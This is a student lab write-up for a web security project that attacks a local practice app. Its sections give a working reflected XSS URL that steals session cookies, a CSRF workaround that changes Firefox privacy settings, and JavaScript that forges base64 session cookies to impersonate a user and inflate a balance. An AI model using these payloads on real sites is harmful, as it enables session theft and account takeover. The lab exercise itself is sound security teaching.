# Project 1

## Team members

- PRO
- zzh

## Procedure

### a

1. Test HTML injection via: `http://localhost:3000/profile?username=<script>alert(1);</script>`, which works.
2. Try `http://localhost:3000/profile?username=hack<script>location.href="/steal_cookie?session_cookie="+document.cookie</script>`, but `+` got interpreted as space.
3. Simple fix: ```http://localhost:3000/profile?username=hack<script>location.href=`/steal_cookie?session_cookie=${document.cookie}`</script>```, but the redirect would be visible to user.
4. Using `fetch`: ```http://localhost:3000/profile?username=hack<script>fetch(`/steal_cookie?session_cookie=${document.cookie}`);</script>```
5. Fixing `User does not exist`: ```http://localhost:3000/profile?username=<script>fetch(`/steal_cookie?session_cookie=${document.cookie}`);document.querySelector("p.error").remove();</script>```

### b

Having tried `<form>`, `XMLHttpRequest` and `fetch`, but all of them refused to send cookies: `Partitioned cookie or storage access was provided to “http://localhost:3000/post_transfer” because it is loaded in the third-party context and dynamic state partitioning is enabled.`. The root cause is that, on firefox:

> A request to access cookies or storage was partitioned because it came from a third-party (a different origin) and dynamic state partitioning is enabled.

Our request does not come from `localhost:3000`, so firefox refuses to send it with cookie.

**Solution**: Change [firefox settings](about:preferences#privacy) according to the image.

![Firefox](./images/firefox.jpg)

After changing the settings and re-visiting our HTML, the attack shall succeed:

![Success](./images/success.jpg)

### c

Let's inspect `document.cookie`:

```text
session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjc2fX0=
```

The value of `session` seems to be base64-encoded. Let's decode and see what it contains:

```json
{
    "loggedIn": true,
    "account": {
        "username": "attacker",
        "hashedPassword": "0fc921dccfcb071132e72385f10d91dcb213983792dfe93de8b5d3274b5a5cf5",
        "salt": "21834708492970860368940710131560218741",
        "profile": "",
        "bitbars": 76
    }
}
```

By inspecting `router.js`, we see that once logged in, the server won't check the correctness of password. So we can simply change `account.username` to `user1`, `account.bitbars` to `200` and base64-encode it. Here's our final script:

```javascript
document.cookie = "session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjIwMH19";
```

### d

From our exploit at [c](#c), we learn that we can modify `account.bitbars` to any value of our choice. However, since username and other details are unknown, we need to generate our payload real-time using JavaScript:

```javascript
const b64 = document.cookie.slice(8);
const data = JSON.parse(atob(b64));
data.account.bitbars = 1000001;
const payload = btoa(JSON.stringify(data));
document.cookie = "session=" + payload;
```

After executing the code and performing a $\$1$ transaction, the balance of our account shall be $\$1000000$.

### e

### f

### g



## References

- Detailed guide on how to install docker: https://lindevs.com/install-docker-ce-on-ubuntu/
- https://stackoverflow.com/questions/168455/how-do-you-post-to-an-iframe
- https://developer.mozilla.org/en-US/docs/Web/Privacy/Storage_access_policy/Errors/CookiePartitionedForeign
- https://stackoverflow.com/questions/35325370/how-do-i-post-a-x-www-form-urlencoded-request-using-fetch
